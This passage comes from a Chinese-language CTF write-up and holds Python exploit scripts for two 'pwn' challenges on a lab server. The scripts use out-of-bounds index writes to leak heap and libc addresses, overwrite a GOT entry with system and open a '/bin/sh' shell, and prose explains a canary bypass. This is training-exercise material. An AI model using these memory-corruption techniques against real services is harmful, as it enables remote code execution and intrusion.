&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;1&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Query&nbsp;index:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(index))
&nbsp;
def&nbsp;sub_update(io,&nbsp;index,&nbsp;number):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;2&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Update&nbsp;index:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(index))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Update&nbsp;number:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(number))
&nbsp;
def&nbsp;sub_sort(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;3&quot;)
&nbsp;
def&nbsp;sub_quit(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;7&quot;)
&nbsp;
def&nbsp;pwn(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#prepare
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;15
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;2&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clear(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;2&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;2&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;13
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#system_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;system_addr))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;5,&nbsp;0x7ffffff0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;6,&nbsp;0)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;9,&nbsp;-1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;10,&nbsp;0)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;13,&nbsp;100)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;history(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;ID&nbsp;=&nbsp;1&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Data&nbsp;=&nbsp;2&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;int(io.read_until(&quot;&nbsp;&quot;)[:-1])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;heap_addr&nbsp;=&nbsp;struct.unpack(&quot;I&quot;,&nbsp;struct.pack(&quot;i&quot;,&nbsp;data))[0]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;heap_addr:&quot;,&nbsp;hex(heap_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data_buff&nbsp;=&nbsp;heap_addr&nbsp;-&nbsp;0x08
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;data_buff:&quot;,&nbsp;hex(data_buff)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clear(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.interact()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts_got&nbsp;=&nbsp;0x0804d030
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;1,&nbsp;puts_got)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;history(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;ID&nbsp;=&nbsp;2&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Len&nbsp;=&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;int(io.read_until(&quot;,&nbsp;Data&quot;)[:-6])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;real_addr&nbsp;=&nbsp;struct.unpack(&quot;I&quot;,&nbsp;struct.pack(&quot;i&quot;,&nbsp;data))[0]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;real_addr:&quot;,&nbsp;hex(real_addr)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#elf_info&nbsp;=&nbsp;ELF(&quot;./libc.so.6&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elf_info&nbsp;=&nbsp;ELF(&quot;./libc.so&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;hex(elf_info.symbols[&quot;puts&quot;])
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_addr&nbsp;=&nbsp;real_addr&nbsp;-&nbsp;elf_info.symbols[&quot;puts&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;elf_info.symbols[&quot;system&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;system&nbsp;addr:&quot;,&nbsp;hex(system_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;4&quot;]&nbsp;*&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zero_area&nbsp;=&nbsp;data_buff&nbsp;+&nbsp;(2&nbsp;+&nbsp;5&nbsp;+&nbsp;5)&nbsp;*&nbsp;4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;1,&nbsp;zero_area)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;history(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t_reload(io,&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_query(io,&nbsp;100)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;begin_addr&nbsp;=&nbsp;data_buff&nbsp;+&nbsp;0x20&nbsp;+&nbsp;1&nbsp;*&nbsp;4
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;atoi_got&nbsp;=&nbsp;0x804d020
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;atoi_got:&quot;,&nbsp;hex(atoi_got)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global_addr&nbsp;=&nbsp;(data_buff&nbsp;&amp;&nbsp;0xffffff00)&nbsp;+&nbsp;0x10100
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;global_addr:&quot;,&nbsp;hex(global_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff&nbsp;=&nbsp;global_addr&nbsp;-&nbsp;begin_addr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;diff
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff_index&nbsp;=&nbsp;(0x100e8&nbsp;-&nbsp;(0x058&nbsp;+&nbsp;4))&nbsp;/&nbsp;4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index,&nbsp;0x1000)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;1,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;2,&nbsp;atoi_got&nbsp;-&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;3,&nbsp;0)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&#39;q&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort2(io,&nbsp;seq,&nbsp;4)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#if&nbsp;diff&nbsp;&lt;&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t_exit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;system_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;3,&nbsp;system_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;/bin/sh&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True
&nbsp;
io&nbsp;=&nbsp;get_io(target)
pwn(io)</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">成功截图：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01a65f823511e9beb0.png" title="t012239f29c30560db0.png" alt="http://p1.qhimg.com/t012239f29c30560db0.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">600&nbsp; Pwn-2</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这个题目与pwn400属于同一系列，大部分代码相同，可以看成pwn2增加了一些机制，在history_info_struct结构体部分，增加了一个canary，如下:</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 history_info_struct struc ; (sizeof=0xC)</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000000 count&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000004 canary&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd ?</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">00000008 number_buff&nbsp;&nbsp;&nbsp;&nbsp; dd ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; offset</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">0000000C history_info_struct ends</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">其中canary的计算至于一个随机数和count有关系，而且count的计数也只与你实际输入的个数相关，而不是pwn1中最开始的那个数量，如下：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01ac841e5bdf0d0ab6.png" title="t01387ebf7d3664d406.png" alt="http://p5.qhimg.com/t01387ebf7d3664d406.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">在查询和修改之前都会检查canary：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 查询：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01f59815a45f833cbd.png" title="t01116285cbdc7ef69e.png" alt="http://p6.qhimg.com/t01116285cbdc7ef69e.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修改：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01b7568045274d91c5.png" title="t01a5b3247d4c02286a.png" alt="http://p0.qhimg.com/t01a5b3247d4c02286a.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 然而，index漏洞依然存在，但是不能只通过修改count和info就能利用的，因为count和canary及随机数相关，必须联动修改。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 问题1，泄露随机数：由于查询可以越界1个index，在打印历史记录时，如果count值小于等于0，那么他可以打印基本信息，如id号和count值，但是不打印后续信息，所以可以更改后一个history_manager_struct的值为随机数全局变量的地址，通过长度泄露得知。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 问题2，构造利用，其实基本和pwn1差不多，也需要构造两个假节点，一个节点的count值为-2，另一个的值为特别大的数，但是在reload之前，由于不修改dest中的内容，所以count和canary提取能够预知的只有一个，因为提取布置内存的时候，随机数还没有泄露，而泄露了以后，clear函数就不能在执行，所以在这里先不设置count，因为canary = count^随机数，所以我可以将canary先设置非常小，然后再知道随机数后，就可以得到相应的count值，由于是随机数，每位都随机，所以canary较小时，count一般较大，最后计算出count后，直接通过越界去布置这个内容即可。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 问题3，got表不合适，pwn1中可以先不设置元素内容，但是数量依然有保障，但是pwn2是根据你实际输入的个数来确定你的count，所以每次会大量修改got表中的值，这样先修改后跨函数利用的话，基本都会崩溃。在这里采用reload的方式，将已知的值存在另一块内存中，然后直接copy过来。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 问题4，还需要注意的是堆内存需要进行转移，由于设置的东西较多，设置的时候需要申请的值也比较多，但是后面一部分堆没有map进来，所以需要进行转移。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 详细方法见脚本：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">__author__&nbsp;=&nbsp;&quot;pxx&quot;
from&nbsp;zio&nbsp;import&nbsp;*
from&nbsp;pwn&nbsp;import&nbsp;*
import&nbsp;struct
#target&nbsp;=&nbsp;&quot;./pwn2&quot;
target&nbsp;=&nbsp;(&quot;pwn.lab.seclover.com&quot;,&nbsp;22222)
&nbsp;
def&nbsp;get_io(target):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;&quot;green&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;w_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;&quot;blue&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999,&nbsp;print_read&nbsp;=&nbsp;r_m,&nbsp;print_write&nbsp;=&nbsp;w_m)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;io
&nbsp;
def&nbsp;history(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;history&quot;)
&nbsp;
def&nbsp;t_reload(io,&nbsp;t_id):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;reload&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Reload&nbsp;history&nbsp;ID:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(t_id))
&nbsp;
def&nbsp;clear(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;clear&quot;)
&nbsp;
def&nbsp;sort(io,&nbsp;seq):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;sort&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;How&nbsp;many&nbsp;numbers&nbsp;do&nbsp;you&nbsp;want&nbsp;to&nbsp;sort:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(len(seq)))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;seq:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Enter&nbsp;a&nbsp;number:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(item)
&nbsp;
def&nbsp;sort2(io,&nbsp;seq,&nbsp;count):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;sort&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;How&nbsp;many&nbsp;numbers&nbsp;do&nbsp;you&nbsp;want&nbsp;to&nbsp;sort:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(count))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;seq:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Enter&nbsp;a&nbsp;number:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(item)
&nbsp;
def&nbsp;t_exit(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;_CMD_$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;exit&quot;)
&nbsp;
def&nbsp;sub_query(io,&nbsp;index):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;1&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Query&nbsp;index:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(index))
&nbsp;
def&nbsp;sub_update(io,&nbsp;index,&nbsp;number):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;2&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Update&nbsp;index:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(index))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Update&nbsp;number:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(str(number))
&nbsp;
def&nbsp;sub_sort(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;3&quot;)
